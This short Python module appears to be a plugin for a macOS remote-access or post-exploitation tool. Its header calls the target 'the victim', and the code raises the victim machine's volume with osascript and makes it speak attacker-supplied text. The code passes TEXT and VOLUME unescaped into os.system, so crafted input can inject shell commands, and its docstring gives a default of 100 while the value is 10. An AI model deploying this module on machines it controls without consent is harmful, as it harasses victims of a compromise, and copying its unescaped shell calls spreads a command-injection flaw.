'''
NAME: Say
DESCRIPTION: Send a say command to the victim with the provided text
VAR TEXT: The text to be said by the victim machine
VAR VOLUME = 10: The volume of the victim machine, defaults to 100/100
'''
import os

set_volume = "osascript -e 'set volume output volume {}'"
os.system(set_volume.format(VOLUME))

os.system('say "{}"'.format(TEXT))
print("Successfully said: {}".format(TEXT))